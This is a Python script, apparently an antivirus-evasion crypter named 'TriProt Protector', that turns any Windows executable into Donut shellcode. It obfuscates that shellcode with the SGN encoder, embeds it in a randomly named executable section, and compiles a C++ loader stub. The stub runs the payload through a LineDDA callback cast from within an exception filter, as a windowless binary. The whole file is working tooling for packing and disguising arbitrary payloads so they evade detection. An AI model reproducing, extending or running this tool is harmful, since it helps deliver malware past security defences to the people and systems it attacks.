# --- START OF FILE TriProt_LineDDA_v4.py ---

import subprocess
import os
import sys
import argparse
import tempfile
import time
import threading
import random
import string
import shutil
import math
from colorama import init, Fore, Style

init(autoreset=True)

# --- Configuration ---
UD = "./Utils/"
DDP = os.path.join(UD, "E2S.X") # Donut Path
DSP = os.path.join(UD, "SGN.X") # SGN Path
DCP = "cl.exe"                 # Compiler Path

DA = "-z 4" # Donut args
SAT = '-i "{ib}" -o "{ob}"' # SGN args
# Compiler/Linker flags separated
COMPILER_FLAGS = [
    '/nologo', '/O1', '/GL', '/Gy', '/GS-', '/MT', '/EHsc', '/W3',
    '/D', 'WIN32', '/D', 'NDEBUG', '/DEBUG:NONE'
]
LINKER_FLAGS = [
    '/LTCG', '/OPT:REF', '/OPT:ICF', '/INCREMENTAL:NO', '/SUBSYSTEM:WINDOWS'
]
LIBRARIES = [
    'kernel32.lib', 'user32.lib', 'gdi32.lib'
]

# --- Console Output Helpers --- (Identical)
def pi(m): print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {m}")
def ps(m): print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {m}")
def pw(m): print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {m}")
def pe(m): print(f"{Fore.RED}[-]{Style.RESET_ALL} {m}")

# --- Spinner --- (Identical)
sse = threading.Event()
st = None
def sf():
    cs = ['|','/','-','\\']; i = 0
    while not sse.is_set():
        try: sys.stdout.write(f"\r{Fore.YELLOW}{Style.BRIGHT}{cs[i % 4]}{Style.RESET_ALL} Processing..."); sys.stdout.flush()
        except ValueError: break
        i += 1; time.sleep(0.1)
    if i > 0:
        try: sys.stdout.write('\r' + ' ' * (len(" Processing...") + 2) + '\r'); sys.stdout.flush()
        except ValueError: pass
def ss():
    global st;
    if st and st.is_alive(): return
    sse.clear(); st = threading.Thread(target=sf, daemon=True); st.start()
def stsp():
    global st
    if st and st.is_alive(): sse.set(); st.join(timeout=0.5)
    try: sys.stdout.write('\r' + ' ' * (len(" Processing...") + 2) + '\r'); sys.stdout.flush()
    except ValueError: pass
    st = None

# --- Helper Functions ---
def rcmd(cmd):
    stsp()
    use_shell = isinstance(cmd, str)
    creation_flags = 0
    if sys.platform == "win32":
        creation_flags = subprocess.CREATE_NO_WINDOW

    try:
        process = subprocess.Popen(
            cmd,
            shell=use_shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=creation_flags
        )
        stdout_bytes, stderr_bytes = process.communicate()
        stdout = stdout_bytes.decode(sys.stdout.encoding or 'utf-8', errors='replace') if stdout_bytes else ''
        stderr = stderr_bytes.decode(sys.stderr.encoding or 'utf-8', errors='replace') if stderr_bytes else ''

        if process.returncode != 0:
            stsp()
            pe(f"External command failed (Code: {process.returncode}): "
               f"{os.path.basename(cmd if isinstance(cmd, str) else cmd[0])}")
            if stdout:
                pe("--- Stdout Output ---")
                print(stdout.strip(), file=sys.stderr)
                pe("--- End Stdout ---")
            if stderr:
                pe("--- Stderr Output ---")
                print(stderr.strip(), file=sys.stderr)
                pe("--- End Stderr ---")
            raise subprocess.CalledProcessError(
                process.returncode, cmd, output=stdout, stderr=stderr
            )
    except FileNotFoundError as e:
        stsp()
        pe(f"Required tool not found: "
           f"{os.path.basename(cmd if isinstance(cmd, str) else cmd[0])}")
        pe(f"Error details: {e}")
        raise
    finally:
        stsp()


def rtp(target, default, name):
    abs_target = os.path.abspath(target) if target else None
    abs_default = os.path.abspath(default)
    if abs_target and os.path.isfile(abs_target): return abs_target
    if os.path.isfile(abs_default): return abs_default
    search_name = os.path.basename(target if target else default)
    found_path = shutil.which(search_name)
    if found_path: return os.path.abspath(found_path)
    final_target = target if target else default
    pw(f"{name} ('{final_target}') resolution failed; relying on shell PATH.")
    return final_target

def check_libs(libs_to_check):
    lib_paths = os.environ.get('LIB', '').split(os.pathsep)
    if not lib_paths:
        pw("LIB environment variable not found or empty. Cannot check library existence.")
        return False # Cannot confirm

    all_found = True
    pi("Checking for required libraries in LIB paths:")
    for lib in libs_to_check:
        found = False
        for path in lib_paths:
            if os.path.isfile(os.path.join(path, lib)):
                ps(f"  [+] Found: {lib} (in {path})")
                found = True
                break
        if not found:
            pe(f"  [-] Missing: {lib}")
            all_found = False

    if not all_found:
        pe("One or more required libraries were not found in LIB paths.")
        pw(f"Current LIB paths: {';'.join(lib_paths)}")
        pw("Ensure you are running in a correctly configured Developer Command Prompt.")
    return all_found


def cce():
    compiler_path = shutil.which("cl.exe")
    if not compiler_path:
         pe("Build environment error: 'cl.exe' not found in PATH.")
         pw("Ensure script runs within a configured Developer Command Prompt.")
         return False
    missing = [v for v in ("INCLUDE", "LIB", "LIBPATH") if not os.environ.get(v)]
    if missing:
        pw(f"Build environment warning: Missing {', '.join(missing)} variables.")
        # Don't return False here yet, check libs explicitly later
    return True

def format_size(size_bytes):
    if size_bytes == 0: return "0 B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    num_bytes = abs(size_bytes)
    try:
        if num_bytes < 1:
            return f"{size_bytes} B"
        i = int(math.floor(math.log(num_bytes, 1024)))
        i = max(0, min(i, len(size_name) - 1))
        p = math.pow(1024, i)  # <-- Moved outside the conditional
        s = round(size_bytes / p, 2)
        return f"{s} {size_name[i]}"
    except (ValueError, OverflowError):
        return f"{size_bytes} B"

# --- Main Logic ---
def main():
    p = argparse.ArgumentParser(
        description="TRIPROT Protector (LineDDA v4): Embeds payload, uses LineDDA. Includes lib check.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    # Args setup identical to v3
    p.add_argument("-i","--input",    required=True, help="Input executable (.exe) to protect.")
    p.add_argument("-o","--output",   required=True, help="Output path for the protected executable (.exe).")
    p.add_argument("--donut",         default=DDP,   help="Path to Donut executable (E2S.X).")
    p.add_argument("--sgn",           default=DSP,   help="Path to SGN executable (SGN.X).")
    p.add_argument("--compiler",      default=DCP,   help="Path to C++ compiler (cl.exe).")
    p.add_argument("--keep-temp",     action="store_true", help="Keep temporary files and directory after execution.")
    args = p.parse_args()

    stsp()
    print("-" * 60)
    pi(f"{Fore.WHITE}{Style.BRIGHT}TRIPROT Protector (LineDDA v4) Initializing...{Style.RESET_ALL}")
    print("-" * 60)

    if not cce(): sys.exit(1)
    # Explicitly check for necessary libraries after CCE check
    if not check_libs(LIBRARIES): sys.exit(1)


    original_size = 0
    td = None
    try:
        # Setup identical to v3
        iea = os.path.abspath(args.input)
        oea = os.path.abspath(args.output)
        if not os.path.isfile(iea): pe(f"Input file '{args.input}' not found."); sys.exit(1)
        original_size = os.path.getsize(iea)
        odir = os.path.dirname(oea);
        if odir: os.makedirs(odir, exist_ok=True)
        compiler = rtp(args.compiler, DCP, "Compiler (cl.exe)")
        donut    = rtp(args.donut,    DDP,   "Donut")
        sgn      = rtp(args.sgn,      DSP,   "SGN")
        if not shutil.which(compiler): pe(f"Resolved compiler '{compiler}' not found or not executable."); sys.exit(1)

        td = tempfile.mkdtemp(prefix="TriProtDDA_")
        pi(f"Using temporary directory: {td}")
        bpath = os.path.join(td, "payload.bin")
        encpath = os.path.join(td, "payload.enc")
        stubcpp = os.path.join(td, "stub.cpp")

        # --- Step 1: Donut --- (Identical to v3)
        pi("Stage 1: Transforming input PE to position-independent shellcode...")
        ss(); cmd = f'"{donut}" -i "{iea}" -o "{bpath}" {DA}'; rcmd(cmd); stsp()
        if not os.path.exists(bpath) or os.path.getsize(bpath) == 0: pe("Shellcode file missing/empty after Donut."); sys.exit(1)
        ps("Shellcode generation successful.")

        # --- Step 2: SGN --- (Identical to v3)
        pi("Stage 2: Applying SGN encoding/obfuscation layer...")
        ss(); cmd = f'"{sgn}" {SAT.format(ib=bpath, ob=encpath)}'; rcmd(cmd); stsp()
        if not os.path.exists(encpath) or os.path.getsize(encpath) == 0: pe("Encoded payload missing/empty after SGN."); sys.exit(1)
        ps("Payload encoding successful.")

        # --- Step 3: Generate C++ stub --- (Identical to v3)
        pi("Stage 3: Constructing executable loader stub (RWX Section)...")
        sec_name = "." + "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 8)))
        pi(f"   - Defining randomized executable section: {Fore.MAGENTA}{sec_name}{Style.RESET_ALL}")
        hex_vals = ""; payload_size_str = "0 B"
        try:
            pi("   - Reading encoded payload..."); ss()
            with open(encpath, "rb") as f: data = f.read()
            stsp(); payload_size_str = format_size(len(data))
            hex_vals = ", ".join(f"0x{b:02x}" for b in data) if data else "0"
            if not data: pw("   - Warning: Encoded payload data is empty.")
        except OSError as e: stsp(); pe(f"   - Failed to read encoded payload '{encpath}': {e}"); sys.exit(1)
        pi(f"   - Embedding {Style.BRIGHT}{payload_size_str}{Style.RESET_ALL} of encoded payload into section...")
        pi(f"   - Setting execution trigger: {Fore.YELLOW}LineDDA Callback{Style.RESET_ALL}")
        stub_code = f"""#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#pragma comment(linker, "/SECTION:{sec_name},ERW")
#pragma section("{sec_name}", execute, read)
__declspec(allocate("{sec_name}")) const unsigned char g_payload[] = {{{hex_vals}}};

typedef VOID (CALLBACK* LINEDDAPROC)(int, int, LPARAM);

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{{
    if (sizeof(g_payload) < 2)
        return 1;

    auto cb_ptr = reinterpret_cast<LINEDDAPROC>(const_cast<unsigned char*>(g_payload));

    __try
    {{
        RaiseException(0, 0, 0, nullptr);
    }}
    __except ((cb_ptr(0, 0, (LPARAM)0), EXCEPTION_EXECUTE_HANDLER))
    {{
    }}

    return 0;
}}"""


        try:
            pi("   - Writing C++ stub file..."); ss()
            with open(stubcpp, "w", encoding="utf-8") as f: f.write(stub_code)
            stsp(); ps("   - Stub file written successfully.")
        except OSError as e: stsp(); pe(f"   - Failed to write C++ stub file '{stubcpp}': {e}"); sys.exit(1)

        # --- Step 4: Compile stub.cpp ---
        pi(f"Stage 4: Compiling stub with LTCG (using LineDDA trigger)...")
        ss()
        try:
            compile_cmd_list = [ compiler ]
            compile_cmd_list.extend(COMPILER_FLAGS)
            compile_cmd_list.append(stubcpp)
            # Using /Fe:"path" syntax for robustness
            compile_cmd_list.append(f'/Fe{oea}')
            compile_cmd_list.append('/link')
            compile_cmd_list.extend(LINKER_FLAGS)
            compile_cmd_list.extend(LIBRARIES)

            # --- Debug Print Command ---
            pi("Attempting to run compiler with command list:")
            # Create a string representation for printing that's easier to read
            print_cmd = ' '.join(f'"{arg}"' if ' ' in arg else arg for arg in compile_cmd_list)
            print(f"  {print_cmd}\n")
            # --- End Debug Print ---

            rcmd(compile_cmd_list) # Pass list, uses shell=False

        except Exception as e:
            # rcmd already prints stderr if captured
            pe(f"Stub compilation failed. Review build environment, compiler flags, and LineDDA usage.")
            pe(f"Generated C++ stub (may be deleted): {stubcpp}")
            sys.exit(1)
        finally: stsp()

        # --- Post-Compile Checks --- (Identical to v3)
        final_size = 0
        if not os.path.exists(oea) or os.path.getsize(oea) == 0: pe("Compilation resulted in missing/empty output executable."); sys.exit(1)
        else: final_size = os.path.getsize(oea); ps("Stub compilation successful.")

        # --- Final Summary --- (Identical to v3)
        stsp()
        print("-" * 60); ps(f"{Fore.GREEN}{Style.BRIGHT}Protection Applied Successfully! (Using LineDDA Trigger v2){Style.RESET_ALL}")
        print(f" {Fore.CYAN}{Style.BRIGHT}Input File:{Style.RESET_ALL}  {iea}"); print(f" {Fore.CYAN}{Style.BRIGHT}Output File:{Style.RESET_ALL} {oea}")
        print("-" * 60); print(f" {Fore.YELLOW}Original Size:{Style.RESET_ALL} {format_size(original_size)}"); print(f" {Fore.YELLOW}Final Size:   {Style.RESET_ALL} {format_size(final_size)}")
        size_diff = final_size - original_size; diff_sign = "+" if size_diff >= 0 else "-"
        print(f" {Fore.YELLOW}Size Change:{Style.RESET_ALL}  {diff_sign}{format_size(abs(size_diff))}"); print("-" * 60)
        pw("Note: Payload execution relies on the LineDDA callback."); pw("Effectiveness depends on shellcode robustness & single-call assumption."); print("-" * 60)

    except Exception as e:
        stsp(); pe(f"An critical error occurred during processing: {e}"); import traceback; traceback.print_exc(); sys.exit(1)
    finally: # Cleanup identical to v3
        stsp();
        if td and os.path.isdir(td):
            if not args.keep_temp:
                pi(f"Cleaning up temporary directory: {td}")
                try: shutil.rmtree(td); ps("Cleanup successful.")
                except OSError as e: pw(f"Cleanup warning: Could not remove temp directory {td}: {e}")
            else: pi(f"Temporary build artifacts retained at: {td}")

if __name__ == "__main__": # identical to v3
    try: main()
    except KeyboardInterrupt: stsp(); pw("\nOperation cancelled by user."); sys.exit(1)
    except SystemExit as e: stsp(); sys.exit(e.code)
    except Exception as e: stsp(); pe(f"Unhandled exception caught at top level: {e}"); import traceback; traceback.print_exc(); sys.exit(99)
    finally: stsp()